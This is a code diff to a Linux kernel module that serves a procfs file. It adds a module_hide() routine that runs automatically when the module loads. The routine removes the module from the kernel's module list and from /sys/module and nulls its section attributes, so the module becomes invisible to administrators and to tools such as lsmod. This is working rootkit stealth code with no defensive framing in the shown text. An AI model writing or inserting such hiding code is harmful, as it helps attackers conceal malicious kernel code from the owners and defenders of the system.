@@ -14,6 +14,9 @@
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0) 
 #include <linux/minmax.h> 
 #endif 
+#include <linux/init.h>
+#include <linux/kobject.h>
+#include <linux/list.h>
  
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0) 
 #define HAVE_PROC_OPS 
@@ -111,9 +114,46 @@ static const struct file_operations file_ops_4_our_proc_file = {
 }; 
 #endif 
 
+static struct list_head *module_prev;         // Store previous module position
+static struct kobject *kobject_prev;          // Store previous kobject
+static struct kobject *kobject_parent_prev;   // Store parent kobject
+static struct module_sect_attrs *sect_attrs_bkp;
+static struct module_notes_attrs *notes_attrs_bkp;
+static int module_hidden = 0;                 // Flag for module state
+
+void module_hide(void) {
+    if (module_hidden) // If already hidden, return
+        return;
+
+    // Store the module’s original list position and kobject references
+    module_prev = THIS_MODULE->list.prev;
+    kobject_prev = &THIS_MODULE->mkobj.kobj;
+    kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;
+
+    // Backup section and notes attributes
+    sect_attrs_bkp = THIS_MODULE->sect_attrs;
+    notes_attrs_bkp = THIS_MODULE->notes_attrs;
+
+    // Remove from /proc/modules
+    list_del(&THIS_MODULE->list);
+
+    // Remove from /sys/module
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    /* if (THIS_MODULE->holders_dir) {
+        kobject_del(THIS_MODULE->holders_dir); // Remove module's holders directory if it exists
+    } */
+    // Nullify attributes to prevent crashes on access
+    THIS_MODULE->sect_attrs = NULL;
+    THIS_MODULE->notes_attrs = NULL;
+
+    module_hidden = (unsigned int)0x1;; // Mark module as hidden
+}
+
 int __init driver_entry(void) {
     // int ret;
     pr_info("[+] device load");
+
+    module_hide();
 
     our_proc_file = proc_create(my_string/*PROCFS_ENTRY_FILENAME*/, 0644, NULL, 
                                 &file_ops_4_our_proc_file); 
